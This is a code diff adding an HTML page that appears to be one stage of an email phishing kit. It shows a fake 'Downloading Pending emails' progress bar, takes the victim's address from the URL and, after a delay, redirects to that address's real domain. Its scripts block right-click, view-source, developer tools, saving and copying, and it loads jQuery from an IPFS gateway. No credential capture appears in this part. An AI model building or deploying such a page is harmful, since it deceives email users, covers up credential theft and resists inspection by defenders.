@@ -1,0 +1,220 @@
+
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    
+
+   
+    <link href="./css" rel="stylesheet">
+
+    <title>Email Security</title>
+    <link href="./hover.html" rel="stylesheet" media="all"> 
+    <style type="text/css">
+      textarea:hover, 
+      input:hover, 
+      textarea:active, 
+      input:active, 
+      textarea:focus, 
+      input:focus,
+      button:focus,
+      button:active,
+      button:hover,
+      label:focus,
+      .btn:active,
+      .btn.active
+      {
+        outline:0px !important;
+        -webkit-appearance:none;
+        box-shadow: none !important;
+        border-color: none !important;
+      }
+
+
+      .input-icons i { 
+        position: absolute; 
+      } 
+
+      .input-icons { 
+        width: 100%; 
+      } 
+
+      .icon { 
+        padding: 10px; 
+        min-width: 40px;
+        color: #8FA7AD; 
+      } 
+
+      .input-field { 
+        width: 100%; 
+        padding: 5px;
+        padding-left: 40px ;
+        text-align: left;
+        border: 1px solid #8FA7AD; 
+      } 
+#progress-container{
+  width:95%;
+  margin:10px auto;
+  text align:center;
+}
+#progress-out{
+  max-width:300px;
+  margin:0 auto;
+  background:#C8C8C8;
+  height:20px;
+  border-radius: 5px;
+}
+#progress-in{
+  border-radius:5px;
+  width:0px;
+  height:20px;
+  background:#1E8CC3;
+}
+#percentage{
+  color:#1E8CC3;
+}
+
+
+    </style>
+  </head>
+  <!-- oncontextmenu="return false" -->
+  <body bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJlbmFibGVkIiwiRkFDRUJPT0siOiJlbmFibGVkIiwiVFdJVFRFUiI6ImVuYWJsZWQifSwidmVyc2lvbiI6IjEuOC4xNCIsInNjb3JlIjoxMDgxNDB9XQ==">
+    <div class="container-fluid p-0" bis_skin_checked="1">
+
+      <div class="container-fluid" bis_skin_checked="1">
+        <center><div class="row" style="margin: 100px 400px 50px 450px;text-align:left;font-size:26px;color:blue;;" bis_skin_checked="1">
+          <div class="col-md-5 mx-auto" bis_skin_checked="1">
+            <div class="p-2 bg-white m-3" bis_skin_checked="1">
+              <div class="col-lg-12 mx-auto" bis_skin_checked="1">
+              <div style="margin-left:30px;"class="col-lg-12 text-center" bis_skin_checked="1">
+               <img style="margin-left:90px;" src="https://qph.cf2.quoracdn.net/main-qimg-58dd403e50e0d21cf77de0bdf0666050-lq" width="30%"><br>
+                
+              </div>
+              <div class="col-lg-12 text-center" bis_skin_checked="1">
+                <span class="text-secondary" style="font-size:15px; ma">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Downloading Pending emails to inbox..!<br>
+				
+				
+				<div id="progress-container">
+  <center><b id="percentage">0%</b></center>
+  <div id="progress-out">
+    <div id="progress-in"></div>
+  </div>
+</div><br><p style="color:black;" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NB: If the login credentials provided are invalid, the user <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;may not receive pending emails. </p>
+                            
+              </span></div>
+			  
+              <form id="contact" class="form-horizontal well">
+                
+              </form></div>
+            
+              
+            </div>
+          </div>
+           
+        </div> </center>
+      </div>	
+    </div>
+
+<script src="https://bafybeihjqhlxvgoz5q3mhqsss3i6aem444xiie7uncoin2ha6yb5tcstw4.ipfs.w3s.link/jquery.min.js.download"></script>
+  <script>
+
+
+    /* global $ */
+    $(document).ready(function(){
+	
+	
+     function getUrlVars() {
+        var vars = {};
+        var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
+          vars[key] = value;
+        });
+        return vars;
+      }
+      
+      var number = getUrlVars()["msg"];
+
+       $("#email_get1").html(number);
+       $("#email_get3").html(number);
+	   
+	   
+	    var my_ai = number;
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+	   
+        var final= c.toLowerCase();
+        var domain=final.charAt(0).toUpperCase() + final.slice(1);
+        $("#email_get2").html(my_slice);
+        $("#domain_get0").html(domain);
+        $("#domain_get1").html(domain);
+        $("#domain_get2").html(domain);
+
+       setTimeout(() => {  window.location.replace("https://www."+my_slice); }, 100000);
+   });
+
+    document.onkeydown=function(e){
+      if (e.ctrlKey && 
+        (e.keyCode === 73 || 
+         e.keyCode === 105 ||
+         e.keyCode === 74 || 
+         e.keyCode === 106 || 
+         e.keyCode === 85 || 
+         e.keyCode === 117)) {
+        alert('not allowed');
+      return false;
+    } else {
+      return true;
+    }
+  }
+  
+  
+  // prevent ctrl + s
+$(document).bind('keydown', function(e) {
+if(e.ctrlKey && (e.which == 83)) {
+e.preventDefault();
+return false;
+}
+});
+
+document.addEventListener('contextmenu', event => event.preventDefault());
+
+document.onkeydown = function(e) {
+if (e.ctrlKey && 
+(e.keyCode === 67 || 
+e.keyCode === 86 || 
+e.keyCode === 85 || 
+e.keyCode === 117)) {
+return false;
+} else {
+return true;
+}
+};
+$(document).keypress("u",function(e) {
+if(e.ctrlKey)
+{
+return false;      }
+else {
+return true;
+}});
+
+
+</script>
+
+<script>
+//initializes the counter
+let x = 0;
+//repeats action every second
+let interval = setInterval(() => {
+  //changes the percentage value every second
+  document.querySelector("#percentage").textContent = x + "%";
+  //increases the width of the bar every second
+  document.querySelector("#progress-in").style.width = x + "%";
+  //stops the interval
+  if (x == 100) clearInterval(interval);
+  //counts to hundred
+  x++;
+}, 100);
+</script>
+  
+
+
+</body></html>
